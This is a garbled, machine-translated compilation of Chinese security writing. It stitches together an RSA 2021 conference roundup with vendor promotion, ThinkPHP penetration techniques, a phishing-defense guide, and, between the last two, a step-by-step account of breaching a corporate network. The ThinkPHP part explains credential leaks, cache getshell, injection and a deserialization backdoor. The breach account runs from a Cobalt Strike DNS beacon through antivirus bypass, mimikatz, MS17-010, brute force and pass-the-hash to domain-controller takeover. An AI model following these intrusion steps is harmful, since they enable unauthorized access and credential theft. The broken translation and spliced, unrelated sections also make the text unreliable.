In network security, he noted, maintainers are processing multiple stacks of connected technology from different cloud providers.

And malicious actors try to disrupt the business and create fear, which leads to increased randomness in the industry.

Ghai said that embracing disorder refers to expecting unexpected results.

He suggested that cybersecurity teams should constantly evaluate and evaluate responses to different types of risks and attacks."If you're' t forward looking then you don't know how to defend," Ghai said."Once you are forward-looking, you can use threat intelligence to understand your vertical opponent."The concepts of zero trust and Rsilience zero trust are also crucial to achieving a recovery."Zero trust has always been important and is necessary in work after COVID," Ghai said. " Based on risk priorities and protection, we can guarantee to bear the consequences of falls."Ghai adds, zero trust is a mindset, and an architecture.

With zero trust, organizations leverage micropartition networks and provide application-layer threat prevention.

Zero trust also includes the use of risk-based, ongoing dual-identity authentication."Above all, limit zero trust to what absolutely necessary and never raise trust on unreliable factors," Ghai said, " Get ready for chaos and we don't fall too often.

Taking a risk-based recovery approach to Rsilience is also related to understanding and managing risk."We want to protect addresses that contain the greatest risk, not the most vulnerabilities," Ghai said.

Organizations can take multiple different ways to recover quickly.

Ghai noted that the NIST network security framework performs well, and each organization needs to deploy an integrated risk management solution and implement methods to quantify all risks (including network risks).

Ghai also stresses that cybersecurity communities must be inclusive and diverse to help the entire community grow.

RSA 2021 will begin on May 17, San Francisco time, the first time the RSA conference has ever adopted a web virtual conference.

More than 100 online information security companies worldwide, including Green Alliance Technology, will attend the conference, and 462 top security practitioners around the world will participate in sharing the conference.

It can be predicted that through this security event, we can learn about the latest security dynamics, cutting-edge technology concepts and future security direction.

The R SA conference has an annual theme (Theme), where the Resilience, means the ability to quickly return to its previous good form after a blow.

This not only requires us to have strong recovery capacity in the event of disaster, but also reminds us to make safety deployment, operations and emergency reserves in advance. Just like this epidemic, we cannot stop some disasters, but as long as we defend well in advance, we can fearless and recover quickly in the face of crisis.

The conference will focus on sharing the security framework, technical architecture, application scenarios, laws and regulations and other technical means used by Resilience practitioners to combat the changing and upgraded attack capabilities of attacks, so that their own protective business can be quickly restored and restored in attacks.

RSA 2021 topic RSA 2021 consists of 24 security salon themes (Track), and the main content and speech in the conference are distributed between May 17 and 20, San Francisco time.

Among them, 46 of the world's top security experts will share topics (Keynotes) as speakers. The following Green Alliance gentleman has selected several speeches worthy of the attention of security practitioners.

The May 17 keynote speech, C E O and president of Fortalice Solutions LLC Theresa Payton, distorted truth, an invisible war of hijacking ideas, will introduce how the attacker uses the wrong information to manipulate public opinion to influence the election, how to help technology companies, governments, enterprises learn, discover and prevent the generation and spread of wrong information, to avoid ideas being artificially manipulated.

The May 19 keynote address was "What Really Happened to SolarWinds:", shared by SolarWinds President and CEO Sudhakar Ramakrishna and Vice President and Director Laura Koetzle of Forrester?It will show you the most complex supply chain attack process so far, which is the first unique insight on security after the positive response to the attack, allowing security researchers to provide better protection against the enterprise supply chain from another perspective.

The May 20 keynote, Global Threat Bulletin: exposing Hacks and Attors shared by Dmitri Alperovitch and Sandra Joyce, Executive Vice President and Director of FireEye, will share some of the latest attacks in the global threat patterns, study the attacks of APT organizations from various countries and nationalities, and provide targeted security strategy advice.

Through the analysis of nearly 500 salon topics in the conference, we have summarized the following 10 hot topics.

Elastic and recovery, resilience and recovery as the theme of the conference (Theme), not only will mention about the rapid recovery of business after the enterprise attack, there are also a lot of topics on how to use advanced architecture, virtualization technology, artificial intelligence and security framework, help enterprises build quickly restore business system after the attack.

Threat intelligence and sharing, threat intelligence is still a hot topic of this conference. As a necessary cornerstone of security products, intelligence is the basis for global enterprises to fight against changing attacks.

But why does intelligence sharing always encounter resistance, or even sharing failure?Many topics of this conference will give corresponding answers and improvement measures.

Intelligence-based threat hunting is also what is to be shared and discussed in this meeting. There will be a lot of space on how to capture threat information through advanced technologies and skills, how to efficiently track hackers and how to predict threats through data use and analysis.

Popular framework, MITER ATT&CK attack knowledge base framework, NIST CSF network security framework, FAIR information risk factor analysis framework are still the framework theme to share more content, indicating that each security enterprise can constantly establish a security system and improve the risk management process through the framework.

The new sharing and application of the MITER Shield active defense knowledge base framework added in this meeting became a highlight, providing framework support for enterprises to transform from passive defense to active defense.

Zero trust, zero trust become one of the hot topics of the conference, many manufacturers will analyze zero trust architecture from different perspectives, including: zero trust system construction scheme, zero trust challenges, in the case of considering privacy deployment of zero trust, believe that the conference zero trust topic will let practitioners in the relevant fields have new harvest.

5G network and edge computing, 5G network rapid development, follow the rapid development of edge computing has become a hot topic, sharing content includes new changes brought by 5G network to network security, 5G network security construction and information monitoring strategy, how the government to promote security 5G ecosystem, 5G driven edge based on edge hybrid computing construction, etc.

The topic includes technology, strategies, regulations and many other dimensions.

6) Internet of Things security, the Internet of Things botnet is extremely active in 2020. Different worm variant versions continue to conduct indiscriminate attacks on the Internet of Things devices, and the malicious behavior is mainly DDoS and mining.

Internet of Things security has become a content that all enterprises need to focus on, including manufacturers.

How to protect the Internet of Things, how to monitor the Internet of Things attacks, and the standards and methods to evaluate the Internet of Things security have become the theme of the Internet of Things security at this conference.

7) cloud security, with the development and popularization of cloud computing and other enterprise-level technology applications, the global industrial Internet has actually been practiced in all walks of life.

The breadth not only covers services, industry and agriculture, but also from business to public welfare and government, the whole society to the comprehensive Internet; in depth, from marketing services, production research and development to operation and management, the Internet penetration into all links within the organization.

Cloud environment includes a variety of cloud computing environments, such as public cloud, private cloud, and hybrid cloud.

Cloud cloud environment faces various threats such as physical data concentration, network isolation and detection difficulties, host and virtual machines, data security, host attacks, and application security.

Sharing topics around the above threats, from the technology, framework, regulations and other perspectives of the analysis, to bring new opinions and suggestions for the cloud security construction.

8) supply chain security, COVID-19 in 2020 has increased the cyber security threat of the supply chain, and the network vulnerabilities in the supply chain in 2019 have continued to increase since 2019.

SolarWinds-based supply chain attacks have become a typical case of supply chain security events.

It is foreseeable that supply chain attacks will grow or even break out over time.

Security practitioners need to pay more attention to the supply chain security in the government, enterprises, education, energy and other industries.

The topic of this conference shared relevant experience and skills from the perspectives of vulnerability analysis, supply chain trust, supply chain trust, supply chain ecology, supply chain process specification and other aspects, aiming to help security practitioners better help relevant enterprises establish a better supply chain security ecology.

9) AI attack and defense, based on artificial intelligence technology, more and more entered our production system. In network security, AI performs automation tasks through machine learning, thus reducing the workload of security experts and detect and detect threats faster and more accurately.

Attackers are constantly evolving, and there have been attacks on AI, including data pollution, confrontation with input, data poisoning, model theft and other methods.

In the face of these targeted AI attacks, security experts have what algorithm improvement and evolution, this conference will share the related A I offensive and defense content.

10) data security and personal privacy, under the COVID-19 pandemic, the world is tracking the virus chain of infection, how to balance personal privacy and personnel tracking is a topic of concern for every country, enterprise; ransomware rampant, new ransomware constantly endanger the data security of government enterprises, American companies suffered extortion caused by a large range of oil supply system paralysis, also put forward a severe test for the data security of each enterprise.
Innovative Sandbox Top Ten Innovative Sandbox is the most innovative competition in the RSA conference, and has been held 16 times so far.

The top 10 companies need to spend 3 minutes to show their innovative highlights and technological breakthroughs to the judges, and finally ranked the first place.

It can be said that the innovative sandbox is the technology vane of the security industry, but also the vane of capital pursuit.

The competition has raised up to $5.2 billion since the event began.

Company's mail gateway: this product is based on behavior data science, to determine the known correct user mail behavior, detect and block malicious mail, and effectively prevent mail leakage, harpoon attacks.

The product uses the next-generation API architecture to complement Microsoft's Office,Google's Workspace, to make the office environment on the cloud more secure.

Apiiro's SDL products: Products are the industry's first Code Risk Platform™.

Can make the risks in the research and development process fully controllable and visible.

With data-driven decisions, 360 security and compliance risks for applications and infrastructure are well-viewed.

Axis security's zero-trust products: Products can quickly deploy zero-trust solutions with agent-agent enterprise services, reduce deployment speed even down to a minute level, and give administrators easier and secure management access to protected business.

Provide an absolutely controllable zero-trust isolation scheme to ensure the safety of the business.

Cape Privacy's encryption learning platform: It innovatively uses the new machine learning method, —— encryption learning, which can train and learn the data in the cloud by using algorithmic models without decrypting.

Enables data scientists to use the encrypted data, and can improve the accuracy of the data models.

DEDUCE's Authentication Security Platform: The product platform combines identity history data from more than 150,000 Web sites to create what is called the world's most diverse identity data.

Use of identity risk intelligent authentication and active alarm functions to provide powerful authentication solutions, effectively prevent fraud, and reduce the risk of identity fraud.

OPEN RAVEN's cloud data security platform: by automatically mapping all cloud resources, visualization managed cloud resources, clearly display the physical location of all data; automatically classify data using machine learning; use transparent encryption and active identification technology to prevent data leakage; self-developed high-speed cross-network transmission protocol to make each data rapid and convenient sharing.

Satori's Data Access Security platform: It provides a data access service that monitors, classifies, and controls access to sensitive data.

Fully automated processes, concise operating interface, DataSecOps-based data access control allow administrators to quickly deploy and manage data.

STRATA's multi-cloud identity management platform: Companies are likely to use multiple cloud platforms, such as Azure, AWS, Google Cloud Platform.

The key pain point of cloudy cloud is that management of cloudy platforms is not only cumbersome but also prone to security risks.

STRATA's products can just solve this pain point, and using distributed authentication can make enterprises convenient and fast management multi-cloud platform.

WABBI Company's DevSecOps Infrastructure Platform: Platform and development workflow integration together, so that research and development, security, operational guarantee can form a closed loop, security can be expanded across the DevOps workflow, while considering the security and agility of research and development.

WIZ's cloud infrastructure security platform: This platform is a brand new method for cloud security. The platform has multiple features of environmental isolation, vulnerability and patch management, database and asset management, identity authentication management, attack surface burst and leakage management, security configuration management and so on.

You can quickly locate the risk in the cloud environment and respond quickly.

It can be seen from the selected top 10 innovative products that zero trust, data security, identity security, cloud security and other security fields are in urgent need to supplement innovative ideas and methods.

It is worth mentioning that about SDL's innovative products, it can develop a safe life cycle, to help enterprises better develop safe software and products.

As a RSA "security feast" of global nature, we can understand the most cutting-edge technology trends and innovative products in the security circle.

Green Alliance Technology continues to pay attention to the innovative content and hot topics of RSA, and combined with its own accumulated security capabilities to create more complete product lines and solutions, to provide comprehensive safety protection for various governments, operators, enterprises, energy, education, medical care, finance, transportation and other industries.

Since its inception in 1991, RSAC has witnessed the "changes" of the cyber security situation over the past 30 years.

The current auto industry is undergoing a huge transformation from the "mechanical world" to the "information world", and in this context, "cyber security on wheels" has become the focus of global attention.

At the R S A C, researchers from Georgia Tech University and Ben University of NeGave-Gurion in Israel gave a keynote speech on Protect Tesla and Mobil Eyes from instant phantom attack, detailed an A I recognition "phantom attack" for Tesla X and Mobileye630 models.

In the speech, they said the attacker could project road signs on the wall and trees, in the form of a brief flash, mixed in advertising, trigger the Tesla autopilot to respond and apply braking, while the Mobileye 630 issued false instructions based on the projected road signs.

Even more worrying, in the whole process, the attacker does not need to process the image too complex, the scene will not leave any trace, and the human eye can not identify the difference.

In other words, at least the autonomous driving system of the two models in the test cannot accurately identify the authenticity of the road, and hacker organizations can easily take control of the vehicle, once the successful consequences are unimaginable.

As the theme of the conference said, "resilience" has different definitions in different fields, but the constant essence lies in the ability to flexibly respond to the crisis.

At present, China's smart car industry has shown a blowout growth. Relevant institutions predict that by 2025, smart cars will account for 50% of the car sales in that year.

Under a large number of application scenarios of intelligent connected vehicles and vehicle-road coordination, it is urgent to build the network security construction in the automobile field from the top-level global perspective, and build a solid "elastic" defense system of the network security of intelligent vehicles.

As a leading enterprise in the field of network security, 360 is the earliest automotive information security research team security company, and based on 15 years of deep security field accumulated security big data, combat attack and defense security expert team, vulnerability mining, line APT hunting security knowledge and other core ability, built a 360 digital security capability system, continue to enable 360 car security brain open platform, provide efficient car security solutions.

360 Internet of Vehicles security brain consists of an end-to-end defense system composed of on-board end and cloud. By deploying software and hardware security products at the vehicle end, abnormal security intelligence is collected to the cloud platform to sense the risk of automobile network security.

Through the analysis engine, knowledge base and professional analysts provided by the security brain, the cloud automates the analysis, traceability, disposal of the vehicle data, and quickly adjusts the AI model of the related vehicles in the incident area, which can further reduce the cost of this adversarial model.

At the same time, the regional security data can be collected for subsequent investigation and evidence collection.

At the same time, 360 Internet of Vehicles Safety Brain can also provide customized safety management needs according to the different safety needs of the garage, and meet the requirements of equipment and asset management, vulnerability management, safety event management, situation awareness and other requirements.

In the future, 360 will empower the industry. Through the construction of automobile network security laboratory, establish a safety ecology, ensure the safe operation capacity in the whole life cycle of intelligent connected vehicles, and build a solid safe driving lifeline of intelligent connected vehicles.

Because in an asymmetric war in cyberspace, if defenders want to gain a winning lead, they have to rely on intelligence sharing to minimize defense costs and raise attackers exponentially.

However, the process of advancing intelligence sharing is not flat, with the remains of information-sharing initiatives remaining everywhere in the cyber security field.

Even the ISAC (Information Sharing and Analysis Center) system, which has been developed for years, has been questioned at home.

At this year's RSAC conference, CEO Michael Daniel of the Network Threat Alliance (Cyber Threat Alliance), one of the world's most important intelligence sharing organizations, delivered a keynote speech titled "The False hypothesis: Why Intelligence Sharing failed", giving his answer from the perspective of a veteran of intelligence sharing practice.

In Daniel's view, intelligence sharing is constantly frustrated because there are always three false assumptions in this field: 1. Think network threat intelligence is a kind of pure technical data and in practice, the current development of intelligence has been from the file, IP, domain name reputation stage for a long time, from the perspective of intelligence value, more important is the malicious attribute behind the business risk, mitigation measures, attack intention, techniques and tactics, organizational ability and background information, and simple black and white judgment can play the value in safe operation is very low.

This may be clear in the intelligence community, but in the broader market, few people know the content and value of different levels of tactics, operations, and strategic intelligence.

The practical difficulty that all organizations should share these data will make this assumption untenable: first, many companies have no information analysis, production capacity, it is difficult to provide information, and demand, and the value is uncertain; again, from the perspective of use, if a single enterprise really makes few security decisions, then whether the intelligence information supporting these decisions is the comparative advantage.

It is believed that after establishing a sharing channel between organizations, it is easy to share that high-quality intelligence sharing actually requires more security: trust, money, time, and attention.

First, you need to believe that the shared recipient can properly handle intelligence, that trust must increase over time, and second, free intelligence may be good, but not good enough to solve the problem.

Only by ensuring returns through capital investment can we guarantee sufficient value; finally, the sharing activities require stable human input and gain attention, otherwise it is difficult to continue.

With the acceleration of global digital transformation, China's new digital technologies, represented by big data, artificial intelligence, 5G and so on, can complete the iterative upgrading of the original process, environment and architecture system of traditional businesses.

At the same time, security threats are ubiquitous and ubiquitous.

Among them, advanced continuous threat (APT) has the characteristics of directional, long-term persistence, hidden latent and other attacks, security personnel cannot identify and detect using traditional detection means, and intelligence sharing is particularly important.

As the guardian of the digital economy, 360 government and enterprise security Group, based on 15 years of offensive and defensive combat experience and 23 billion security research and development investment, the Security Group has built a digital security capability system with 360 security brain as the core, which has effectively solved the problem of intelligence sharing.

360 At present, the Government and Enterprise Security Group has found more than 40 overseas A P T organizations such as CIA, Sea Lotus, Mahabgrass and Mermaid. With the ability to "see" cyber attacks and threats, it strictly observes the country's first cyber security defense line.

It is worth mentioning that from the current perspective of promoting intelligence sharing in China, the relevant measures are still far from enough compared with the value of the intelligence sharing ecology to the national cyberspace strategy, the investment in intelligence sharing is also needed to cope with more organized professional cyber criminal gangs in the digital era.

Only by effectively establishing an intelligence sharing mechanism at different levels of country, industry and city, can we further form a security capability with sufficient depth and highly resilience and escort the take-off of China in the digital era.

The penetration point of tp5 (the most regular payload.Ha case is not discussed) The following infiltration idea is 5.0. * listing the database connection tp5.0.* under debug. 0. * In debug mode, if the data interaction point constructs the database query error such as s q l injection, empty parameters and other ways, in certain circumstances, the password of the database account may be directly displayed directly.

(The error message is too detailed and easily ignored) Finding injection points in debug mode can also be constructed by the error statement, and d e b u g mode may cause the injection to become the error injection due to debug mode.

Of course, when the target database cannot be unconnected, this injection is quite useful about the log file utilization log file is under the runtime/log directory, the more common path is similar / runtime/log/2020001/01.log, is enabled by default, there are three main ways about this file.

1. part of the common l o g files about http requests will record h t t p requests, and if the corresponding site has a background landing, you can log in the background through the cookie in the record request.

2.Regarding the construction of sql injection under some configurations, the log also records the execution and errors reporting of sql statement, which can be used to construct sql injection, but generally this utilization is relatively less, you need to find the data interaction points and then correspond to the assignments and errors recorded in the log.

3. is a perennial question about getting webshell by cache file under cache file name tp and under white box theoretically makes sense but there are actually partial difficulties when using this vulnerability such as the way of generating cache file cache file name etc.

In the log file, you can determine the cache file naming method of the target t p, etc. For example, the l o g file of the target t p in a certain penetration can note that the error in generating the cache file directly causes the file name output of the cache file.

To guess the generation rule based on the output cache file name, because the cache file name by default is md5 (value), most of the time the filename etc can be brought into value for alignment.

Here by guess and alignment determine is the c a c h e file name generated by the file absolute path of view.

Generally speaking, it is relatively safe to use the php native md5 function to generate md5, the author in order to facilitate directly online encryption.

This basically eliminates a big problem with cache getshell.

After that, I can normally find the interaction points into the library, such as post and message, so I can find a way to get the official development document of the webshell tp5 routing thinkphp series is to expect the website operation and maintenance personnel to set the public to the web root directory, that is, to use it./public/index.The php serves as the entry file.

In the actual infiltration process since thinkphp is the framework involves many secondary developments, some developers will choose to custom an entry file not under the public directory such as / var/www/html/index.The form of the php.

The routing of exp will be involved, due to the custom entry files of some developers.

Generally speaking, try to use it when playing an exp./public/index.Play php, take the following exp, for example, etc.

So a lot of the time is not playing an exp invalid means no hole, in the black box test may be just did not find the right route.

In the process of infiltration, the big idea is actually the same. Try a variety of exp, try to read log files, etc., and you can simply compare the two versions of the directory structure without other information.

For white-box testing, as long as the model.class.The php is not fixed and then found where called the method can be mined to the injection.

Make a simple analysis Model. by select methodclass.The php function can accept a options parameter, in order to constitute the injection must be to enter the _parseOptions method, that is, to bypass two judgments, that is, as long as the transmitted options is an array, and the main key is not an array, you can go into the _parseOptions method can see the incoming options['table'] or options['alias'] and set the options['where'] value to the string, and eventually the options will return directly.

Follow up to the parseWhere method, as long as you bypass if, the final return sql statement is directly spliced, the cause of the injection, is brought directly into the select method execution.

The black box test is also similar, generally the database interaction point is found after the injection attempt.

The penetration of tp3 is used with few points in practical combat, so generally speaking, the main idea of meeting the goal of tp3 is to find log, and then see if there is any background through log. Relatively speaking, the effect will be better than the injection of the hatred framework, cache writes s h e l l and so on.

The new problem of tp6 tp6 utilization chain about model.The __destruct() method of php calls other class __tostring() method text has already been sent, but the text codes the poc, here simply follow.

Set the lazySave property of the object to True into the save method then into updateData method call db method, the statement in the method can be spliced, only set one of these two attributes to a class object to trigger the object's __toString method.

This was later utilized in the same way as in tp5. *.

Then it is consistent with the gadget after tp5. *, the ultimate goal is to achieve this effect of code execution next is to construct poc, due to the test utilization chain, I handwritten a unserialize and then generated payload. through the p o c of the Dido1960 boss code
This utilizes the chain requires a deserialized controllable point, and secondary development may lead to code execution after using unserialize.

It may also be used to form a backdoor to tp6, and if the server permission has already been obtained otherwise, the unserialize function can be added somewhere for the deserialization.

Summarize the use of thinkphp in China is very high, most small and medium-sized sites will consider using thinkphp secondary development, some large companies will occasionally use tp construction such as temporary activity page, publicity page, etc., and the general site in development attention to safety is not high, in the case of secondary developers level good and bad, tp is relatively easy to find a breakthrough.

The tp framework can form a paradigm penetration scheme, rather than a simple e x p a dozen end, here the author as a brick to attract jade.

None was found, so it was suspected that the site station and library separation performed the- -sql-shell parameter of sqlmap, and ran the SQL statement to verify whether the station and library were separated. Sure enough, the site adopted the station and library separation.

What we now get is the permission of the intranet database server through injection, and because the machine only has the DNS protocol, there is no good way to pop back the shell. of the database server

We now only want to hope to inject reading the account password of the website through SQL, and then log in to the background to look for getshell points.

Finally, through reading the database, I found the account password in the background of the website to log in to the background with the read account password, and find an upload point in the background. However, the suffix whitelist limit and file content detection of the upload place can only upload the file in the picture format.

Finally, through uploading the picture Trojan + resolution vulnerability combination utilization, successfully obtained the server permission.

Use the DNS Beacon to play the shell and then upload the ice scorpion horse to get a more intuitive command execution interface.

For better Intranet penetration, I want to bounce back an CobaltStrike type shell.

But by executing ping baidu, the machine is also only external DNS protocol, so we have to make a DNS Beacon type Trojan.

The DNS Beacon procedure is as follows: Prepare a VP.The S server (you can use our CS server directly), and the machine's 53 port must be open to the public.

Then get a domain name ready.

Configure the resolution records for the domain name, and create A records and NS records.

A record parsed to VP.On the S server, the NS record is resolved to the A record.

CS turns on listening to DNS Beacon,DNS Hosts to fill in our NS records, DNS Host (Stager) to fill in our A records to generate the DNS Trojan, the generated Trojan type is Windows Executable (S).

If the Trojan machine has soft, you can into shellcode, then free compilation.

Execution Trojan online by upload d n s Trojan, the execution online successfully.

The default online is the black box box, nor can you execute the following two commands, so you can normally display and execute the command. Because it is a WinServer2012 machine, you can only catch the hash of the password.

Now we want to have a remote RDP to connect to the machine.

However, there are several problems: the host 3389 port is not open, so you need to manually open to him the account password of the target host that is not caught, so you need to manually create the account.

But the host is soft, so we need to bypass the soft execution create account command open 3389 port WinServer2012 open 3389 port command: argue parameter bypass the soft target machine will be soft poison, so we need to use argue parameter to bypass the soft, execute the user command hang agent because the target machine only external DNS protocol, so our best choice is to build an HTTP protocol agent remote connection 3389 port of the target host network ip, successful RDP connection.

Look through the target machine directory, find that the account password of the previously injected SQLServer database is remotely connected through navicat, browse through the database, and find that there are also user names and MD5 encrypted passwords in the database on the machine.

We can first collect these usernames after looking through the database, execute xp_cmdshell rights because the database server external only DNS protocol, but inside the inner network, you can communicate with other machines.

So successfully bounce back to the database server by putting our D N S Trojan on the got web server and then performing xp_cmdshell remote download and execution

All the machines of the Intranet relay horizontal penetration of the internal network only access the DNS protocol, so our intranet lateral penetration needs to take the obtained web server as the relay monitoring, and conduct the Intranet lateral penetration.

Performing relay listening on the obtained web server currently gets only normal network service permission for the database server and we now need to take rights to the administrator permission.

Use the CobaltStrike plug-in for lifting and the listener selects the zhongji. that you just created

After the execution, the administrator permission was successfully obtained.

Since it is a WinServer2008 machine, running mimikatz, gets an explicit account password.

Right now we have administrator rights for two servers.

And a server is a clear account password, a server is a password hash.

Now we need a broader lateral penetration of the intranet.

Both machines now acquired are in the 192.168 network segment.

But we also need to detect the 10.0 and 172.16 network segments when we scan.

The MS17-010 detection attack on the intranet successfully captured three servers, all in the 192.168 network segment.

Intranet ports 445,1433,3306,6379 are scanned.

S M B blasting on the host with 445 port, using the explicit account password just read.

If the blasting is successful, direct psexec remotely bounce a CobaltStrike shell back.

Three server privileges are obtained here, all in the 192.168 network segment.

For the hosts that did not burst successfully, use the read hash to hash to attack the hosts with open ports 1433 and 3306, and use the account password in the internal net obtained for the database blasting.

If the blasting is successful, perform UDF/XP_cmdshell extraction.

Here U D F rights for MySQL was not executed successfully, but xp_cmdshell was successfully, in the 10.0 network segment.

Break up port 6379 and try directly to access public key if there has unauthorized access or weak password and is a Linux host.

But many machines here have no write permission, and only get a Linux host permission, in the 10.0 network segment.

After the Intranet relay horizontal penetration, you have got 8 Windows servers and 1 Linux server permission.

However, no machine within the domain was found.

However, in the early information collection process, it was learned that the target intranet has the domain environment: xxx.The com, and the domain-controlled IP addresses are collected.

Later, a p i n g domain-controlled address was found on the 10.0 machine.

In-domain user enumeration on the 10.0 machine found can ping domain control, hang agents on the machine, ready to enumate users in the domain.

Uername uses the user name collected in the database + my super username dictionary.

Through intra-domain username enumer, more than 100 in-domain usernames are enumerated.

After the domain user password collision gets the domain user name, then check which user names are in the previous database, find its corresponding MD5 password to decrypt the online website, and try to collision.

Finally, finally collision a domain account belongs to the personnel of the information management department.

Then, using the domain host to open the 3389 port remote RDP connection of 3389, immediately pop back a dns beacon shell, and conduct domain information query, and found that the domain account is only an ordinary domain user.

When executed, the same host name was found as the user name just cracked.

You can guess that the machine should be the user's personal office machine.

The port was scanned and the machine opened port 3389.

So by 12 noon (this time is the meal point), the remote RDP logged into the host, for quick information search.

RDP credentials account password extraction when executing the following command, found that the machine is login to other machine in the domain RDP Session so upload mimikatz, using local rights vulnerability, mentioned system permission, execute the following command, successfully get the RDP credentials user name password take domain control query the user name belongs group, found domain control 3389 port open, direct RDP login domain control view the number of domain hosts, 3807, to this, the end of the project.

The main feature of this project is that the host of the Intranet can only pass through the external DNS protocol, so we need to use the DNS Becaon to bounce shell back.

When the internal network horizontal penetration, the host to access as a relay monitoring, the internal network horizontal.

Due to the limited space, this article only discusses the offensive and defensive immunity to phishing email.

This year's online offensive and defensive exercises have a certain change, which is also related to the offensive and defense exercises that have grown up in the past two years. Slowly everyone paid attention to it, it is bound to start to stack the equipment of various manufacturers, inside three layers and three layers outside, but the losses we have suffered before will not be made this year again, right?What about it last year?Achievement the reputation of honey pot, especially the counter honey pot, all kinds of honey cans appear in piles, good things are also bad things, this later.

And many originally without WAF, without firewall estimate should be able to apply for the budget and quickly, which also caused very great trouble to the attack team.

After all, if you have never eaten pork, the protection ability of the boundary should be greatly improved than before.

Direct from the network breakthrough is not not, but the number has been quite rare, but the number of phishing samples reports increased significantly, a variety of fishing attacks emerge in an endless stream, selling ugly, selling good, sell notice, selling news, some copywriting is amazing, amazing.

Especially during the attack and defense drill, under the premise of such a high safety awareness, there are still many company employees are successfully fishing, you really have to admire the plasticity of these copywriting.

The fishing vaccine immunization method provided in this article can effectively curb the rampant phishing email and protect the security of the host machine.

After a simple investigation of the main E X X immunity, the attack technique of phishing email is actually a little clumsy, simple set exe a layer of compression package is reckless, and precisely the most basic most primitive and simple attack method is still easily caught, which is really incredible.

We put aside the security awareness specially emphasized and stated during the offensive and defense drill and how to correctly review phishing emails. During these 365 days, the prevention of phishing emails should be a red line, two-hand preparation.

What is a red line?Employees' correct network awareness of security is the red line, which requires a tireless reminder to emphasize targeted help.

What is a two-hand preparation?First-hand preparation, for phishing email prevention has been mentioned many times before, from the border prevention, from SPF,DKIM,DMARC to solve part of the phishing email crisis, here I do not start, this is to the email administrator need to do.

Look at this year's attack samples, most of them are EXE samples, with a variety of back door code inserted. The principle is simple and easy for the attacker, and the user will be hit if he accidentally clicks.

The main point of this discussion is aimed here.

The overall idea of mail threat protection (this section leads to 360 MeshFire Team) The threat detection of phishing mail attacks is mainly based on establishing a set of safe operation processes for mail threat scenarios, with threat detection and effective interception of externally delivered emails.

First, by deploying mail gateway products at the mail network entrance, filtering known phishing messages through defined rules, including scenarios collecting account passwords purely through social workers or malicious attachment samples rely on mail gateway rules and features; attack detection that have bypassed mail gateway detection rules and sample detection, combined with threat intelligence and sandbox technology.

Mail threat detection theory threat detection method is mainly combining threat intelligence technology and sandbox technology, threat intelligence sources often come from the global network environment, and the terminal virus detection and mail gateway in the sample features often have the limitations of local soft detection, threat intelligence detection mechanism based on threat software feature detection, for threat intelligence failed invasion process, can through sandbox behavior detection, timely discovery Nday or 0day vulnerability attack, and can produce new threat intelligence, added to the existing protection strategy.

Based on this static combined dynamic threat detection analysis model, we can accurately refine invasion events, restore each stage of the attack, extract attack characteristics, and cut off its transmission path before the attack implementation, so as to achieve the purpose of protection target.

Mail threat bypass detection is still based on static and dynamic analysis. In addition to further improving the anti-killing effect, the limited detection effect for static virus library, while the dynamic analysis or behavioral analysis is very dependent on the robustness of the sandbox, and the attack team is not very complicated during the defense drill.

But in the actual offensive and defensive world, some attack programs have achieved very complex attack techniques.

In order to avoid static and dynamic detection, the attachments in phishing messages often adopt the method of compression package encryption, and the simple password encryption in the compression packages can more easily bypass most of the static and dynamic detection.

The E X E accessory acquired by Cobalt Strike was heavily used in this year's attack, and the attack team began to become unscrupulous because the domain front and the CDN hidden C2 were extremely useful.

In fact, this kind of attack method is very simple but effective, especially for this EXE attachment, basically 100% immune.

In fact, this is not a new technology, new method, but it is still a very effective precautions and technique, I call it email vaccine.

What is an email vaccine?What is your normal practice when you receive an email with an attachment?

In addition to review mail content, we often double-click to open the attachment in this email and view the attachment file name, the attack team in the attachment malicious processing, such as long file name, or double extension, to hide the attachment as EXE executable, everything looks perfect, the user did not pay attention is really easy to recruit, then, compression file has a feature, double-click execution, compression package content to a temporary folder, this process can be used to prevent attachments in phishing mail.

Highlight: for domain machines, we can simply push software through GPO to ban compression executable execution, as shown in the figure below: (how to use GPO I will no longer detail) for non-domain machines, need through the register loading, do not look down upon these seemingly useless machines, such as a small office, warehouse, use VPN dial into the company network, etc., etc., these unappreciated machine often more opportunities, they also need to focus.

Using GPO to add the temporary execution path of various decompression software, the specific steps are not repeated here, and the administrator should understand at a glance.

Similarly, it can be targeted.SCR, .Other executable documents such as BAT do the same to have an immune effect.

Of course, the user will find that the normal installation operation will also be limited, the way to solve the problem is very easy, to guide the user to manually save the attachment to the local, and then right-extract to the local folder, and then execute.

Solve the rampant EXE, such as E X E, no longer limited to or rely on the hit rate of local anti-virus engine, so the chance of phishing mail will be greatly reduced, and this method is not only for phishing mail, for many malicious programs, extortion programs have magic effect, belongs to a small help of vaccine method.

Copy macro immunity second, the second type of phishing mail is macro file in the attachment, some applications or some users need to use the macro based on Office document operation, then phishing mail, especially overseas evil forces like to use phishing mail to carry self-run macro, sandbox confrontation has improved another dimension, many automatic sandbox has not correctly resolve carrying encryption lock macro file, thus need to rely on terminal process protection to fight.

But EDR is a little expensive, and not all terminals can successfully enable EDR protection, so in this case, how can we ensure that phishing immunity to email?It's hard, but it's not because technology doesn't, but because it's not available for all companies, because some companies do rely on the presence of macros, so you can't consider using aggressive means to disable macros.

Starting with Office2016, Microsoft began to support policy management of macros and needs to download a plug ugin.

Tip to extract to the machine path of the management group policy:%SystemRoot%\\PolicyDefinitions applies to GPO for management.

First, we consider to ban macros from Office documents from the public network, this option that only supports versions above Office2016.

This means you can still apply macros undigital signed from inside, of course when enabled, even macros already digitally signed won't run as long as it comes from Internet,.

This option guarantees that macros in phishing messages are unexecutable and basically solve most of our problems.

Not only phishing messages, Office is identified based on the regional information added to the AES data, so the macrodocuments downloaded from the Outlook,IE browser or other tools are not executable.

When BLOCK mode is enabled, by default, the Office program should preview in protected mode, and if you stick to click Edit enabled, then these document macros in the phishing mail attachment from the Internet area will not be executed.

Of course, you can also set some exceptions through the GPO, or above the user machine, that will allow the macro files under a certain path for some special users, such as financial users or frequent macro users, to kill two birds with one stone.

Also you can also set and adjust the global parameters through the group policy.

Even in the most aggressive case of the offensive and defensive drills, it is not possible to "globally ban the macro" as an effective means.

Information leakage phishing mail there are some other attacks, mainly to phishing links, for forging so-and-so system password expired prompt or migration prompt, its purpose is to induce users to submit relevant information or directly for the password, this means is now at time to time, but since the use of double factor authentication, the success rate of this attack is very small, personal think to exclude special circumstances, there is no special need for further defense.

After all, defense can cost.

